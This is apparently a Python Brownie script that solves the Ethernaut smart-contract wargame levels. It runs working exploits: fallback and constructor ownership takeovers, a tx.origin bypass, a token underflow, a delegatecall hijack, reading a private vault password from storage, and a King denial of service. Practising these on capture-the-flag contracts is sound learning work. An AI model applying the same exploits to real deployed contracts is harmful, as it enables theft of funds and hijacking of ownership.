from brownie import Fallback, Fallout, CoinFlip, CoinFlipAttacker, Telephone, TelephoneAttacker, TokenThing, Delegation, Delegate, Force, network, config, accounts, Contract
from brownie import AttackForce, Vault, King, AttackKing
from brownie.network.gas.strategies import GasNowStrategy
from brownie.network import gas_price
from scripts.helpful_scripts import *
import time
from web3.auto.infura import w3
import os





def deploy_fallback():
    account = get_account()
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        # if deploying locally, we want to use another account so we can try to escalate privs
        fallBack = Fallback.deploy({"from": accounts[1]}, publish_source=False)
    else:
        fallBackAddr = config["networks"][network.show_active()]["fallBack_address"]
        fallBack = Contract.from_abi("Fallback", fallBackAddr, Fallback.abi)

    print(f"Fallback deployed to {fallBack.address}")
    # now we attack
    attackFallback(fallBack, account)

def attackFallback(_fallBack, _account):

    contributions = _fallBack.getContribution({"from": _account})
    print(f"Before the attack...Current contributions: {contributions} Are we the owner?: {_fallBack.owner() == _account}")

    # adding .wait(1) shouldn't be necessary, but we're explicitly waiting for the block to be mined
    _fallBack.contribute({"value": 500000000000000, "from": _account}).wait(1)
    contributions = _fallBack.getContribution({"from": _account})
    print(f"Contributions now: {contributions}")
    _account.transfer(_fallBack.address,"0.01 ether").wait(1)
    owner = _fallBack.owner()
    areWeOwner = (owner == _account)
    print(f"Sent .01 ETH. Are we the owner?: {areWeOwner}")
    _fallBack.withdraw({"from":_account})
    print("Fallback attacked! Try submitting the solution as complete.")


def deploy_fallout():
    account = get_account()
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        # if deploying locally, we want to use another account so we can try to escalate privs
        fallOut = Fallout.deploy({"from": accounts[1]}, publish_source=False)
    else:
        fallOutAddress = config["networks"][network.show_active()]["fallOut_address"]
        fallOut = Contract.from_abi("Fallout", fallOutAddress, Fallout.abi)

    print(f"Fallout deployed to {fallOut.address}")
    # now we attack
    attackFallout(fallOut, account)

def attackFallout(_fallOut, _account):
    print(f"Before the attack...are we the owner? {_account == _fallOut.owner()}")
    _fallOut.Fal1out({"from":_account, "value":0})
    print(f"After the attack...are we the owner? {_account == _fallOut.owner()}")
    print("Fallout attacked! Try submitting the solution as complete.")


def deploy_coinFlip():
    account = get_account()
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        coinFlip = CoinFlip.deploy({"from": account}, publish_source=False)
    else:
        coinFlipAddress = config["networks"][network.show_active()]["coinFlip_address"]
        coinFlip = Contract.from_abi("CoinFlip", coinFlipAddress, CoinFlip.abi)

    attacker = CoinFlipAttacker.deploy(coinFlip.address, {"from": account}, publish_source=False)
    #network.gas_limit(6700000)
    for x in range(0, 10):
        attacker.guessFlip({"from": account}).wait(1)
        # for the life of me I could not figure out why it reverts as "gas estimation failed" on the 2nd iteration of guessFlip
        # testing with brownie console showed that it works fine when waiting for 30 seconds each iteration
        # I even tried looping from within CoinFlipAttacker, same error
        time.sleep(30)
    #attacker.tenGuesses()
    print("CoinFlip attacked! Try submitting the solution as complete.")

def deploy_telephone():
    account = get_account()
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        telephone = Telephone.deploy({"from": accounts[1]}, publish_source=False)
    else:
        telephoneAddress = config["networks"][network.show_active()]["Telephone_address"]
        telephone = Contract.from_abi("Telephone", telephoneAddress, Telephone.abi)

    print(f"Before the attack...are we owner? {telephone.owner() == account.address}")
    attacker = TelephoneAttacker.deploy(telephone.address, {"from":account}, publish_source=False)
    print(f"After the attack...are we owner? {telephone.owner() == account.address}")
    print("Telephone attacked! Try submitting the solution as complete.")

def deploy_token():
    account = get_account()
    initSupply = ["100"]
    token = deploy_contract(TokenThing, "TokenThing", 1, initSupply)
    deployerAccount = config["networks"][network.show_active()].get("TokenThing_deployer")

    # this challenge gave me the opportunity to learn how to fork
    # we can test out stealing arbitrary wallets
    if network.show_active() in FORKED_LOCAL_ENVIRONMENTS:
        # if fork, set account as the 'player' address, which should already have 20 tokens
        tokenPlayerAddress = config["networks"][network.show_active()]["TokenThing_fork_wallet"]
        account = accounts.at(tokenPlayerAddress, force=True)
    elif network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        # if local, give ourselves 20 tokens to mirror the ethernaut site
        token.transfer(account.address, 20) 
        deployerAccount = accounts[1]

    
    attack_token(token, account, deployerAccount)

def attack_token(_token, _account, _deployerAccount):
    print(f"Before the attack...our balance is {_token.balanceOf(_account.address)}")
    _token.transfer(_deployerAccount, 21, {"from":_account})
    print(f"After the attack...our balance is {_token.balanceOf(_account.address)}")

def deploy_delegation():
    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        delegate = deploy_contract(Delegate, "Delegate", 1, [accounts[1].address])
        
    delegation = deploy_contract(Delegation, "Delegation", 1, [])
    
    data_to_send = Web3.keccak(text="pwn()")[0:4].hex()
    print(f"Before the attack...are we owner of delegation? {delegation.owner() == account.address}")
    account.transfer(delegation.address,amount="0 ether", data=data_to_send).wait(1)
    print(f"After the attack...are we owner of delegation? {delegation.owner() == account.address}")

def deploy_force():
    account = get_account()
    force = deploy_contract(Force, "Force", 1, [])
    attackForce = AttackForce.deploy({"from": account}, publish_source=False)
    attackForce.attack(force.address, {"from":account, "value":1})
    print("Force attacked! Try submitting the solution as complete.")

    
def deploy_vault():
    account = get_account()
    vault = deploy_contract(Vault, "Vault", 1, [bytes("testpassword", encoding='utf8')])

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        w3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))
    else:
        w3 = Web3(Web3.HTTPProvider(f"https://{network.show_active()}.infura.io/v3/{os.getenv('WEB3_INFURA_PROJECT_ID')}"))


    print(f"Connected? {w3.isConnected()}")
    password = w3.eth.get_storage_at(vault.address, 1) # get 2nd variable
    passwordDecode = password.decode("utf-8")
    print(f"Password found: {passwordDecode}")
    vault.unlock(password, {"from":account}).wait(1)
    print(f"Locked? {vault.locked()}")
    print("Vault attacked! Try submitting the solution as complete.")

def deploy_king():
    account = get_account()
    king = deploy_contract(King, "King", 1, [])

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        king = King.deploy({"from": accounts[1].address, "value":1}, publish_source=False)

    print(f"Before attack...Current prize: {king.prize()} King: {king._king()}")
    attackKing = AttackKing.deploy(king.address, {"from": account, "value":king.prize()+2}, publish_source=False)
    print(f"After attack...Current prize: {king.prize()} Are we owner?: {king._king() == attackKing.address}")
    # confirm that the attack was successful
    try:
        king.transfer(account.address, king.prize()+2).wait(1)
        print("King attacked but failed to break the game...")
    except:
        print("King attacked successfully! Submit the solution as complete.")


    

### NOTES
### deploy_contract is used for when the instance is either from address or deployed locally, depending on network
### ClassName.deploy() is used when we want to explicitly deploy it regardless of network

def main():
    #deploy_fallback()
    #deploy_fallout()
    #deploy_coinFlip()
    #deploy_telephone()
    #deploy_token()
    #deploy_delegation()
    #deploy_force()
    #deploy_vault()
    deploy_king()
